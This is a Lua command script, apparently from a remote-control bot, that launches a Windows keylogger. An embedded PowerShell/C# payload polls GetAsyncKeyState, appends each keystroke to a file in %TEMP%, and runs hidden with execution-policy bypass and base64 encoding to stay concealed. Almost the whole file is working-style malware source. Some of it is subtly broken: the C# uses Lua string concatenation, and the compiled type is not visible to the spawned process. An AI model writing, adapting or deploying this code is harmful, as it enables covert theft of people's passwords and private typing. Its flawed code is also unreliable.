-- keylog_start.lua
send_message("⌨️ Starting keylogger...")

-- PowerShell script that runs in background and logs keystrokes
local psScript = [[
$logFile = "$env:TEMP\\keylog.txt"
$pidFile = "$env:TEMP\\keylog_pid.txt"
$code = @'
using System;
using System.Runtime.InteropServices;
using System.IO;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static void Run() {
        string logFile = Environment.GetEnvironmentVariable("TEMP") + "\\keylog.txt";
        bool[] prevState = new bool[256];
        while (true) {
            for (int i = 0; i < 256; i++) {
                bool state = (GetAsyncKeyState(i) & 0x8000) != 0;
                if (state && !prevState[i]) {
                    string key = KeyCodeToChar(i);
                    if (!string.IsNullOrEmpty(key)) {
                        File.AppendAllText(logFile, DateTime.Now.ToString("HH:mm:ss") + " - " + key + "\n");
                    }
                }
                prevState[i] = state;
            }
            System.Threading.Thread.Sleep(10);
        }
    }

    static string KeyCodeToChar(int vKey) {
        if (vKey >= 0x30 && vKey <= 0x39) return ((char)vKey).ToString();
        if (vKey >= 0x41 && vKey <= 0x5A) return ((char)vKey).ToString();
        switch (vKey) {
            case 0x20: return " ";
            case 0x0D: return "[ENTER]";
            case 0x08: return "[BACKSPACE]";
            case 0x09: return "[TAB]";
            case 0x10: return "[SHIFT]";
            case 0x11: return "[CTRL]";
            case 0x12: return "[ALT]";
            default: return "[" .. vKey .. "]";
        }
    }
}
'@

Add-Type -TypeDefinition $code -Language CSharp
$proc = [System.Diagnostics.Process]::Start((New-Object System.Diagnostics.ProcessStartInfo {
    FileName = "powershell"
    Arguments = "-WindowStyle Hidden -NoProfile -Command `"[KeyLogger]::Run()`""
    CreateNoWindow = $true
    UseShellExecute = $false
}))
$proc.Id | Out-File -FilePath $pidFile
]]

-- Base64 encode the script to avoid escaping
local encoded = run_shell('powershell -Command "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\'' .. psScript:gsub("'", "''") .. '\'))"')
if not encoded then
    send_message("❌ Failed to encode keylogger script.")
    return
end

-- Launch the keylogger in a hidden window
run_shell('powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ' .. encoded)

send_message("✅ Keylogger started. Log file: %TEMP%\\keylog.txt")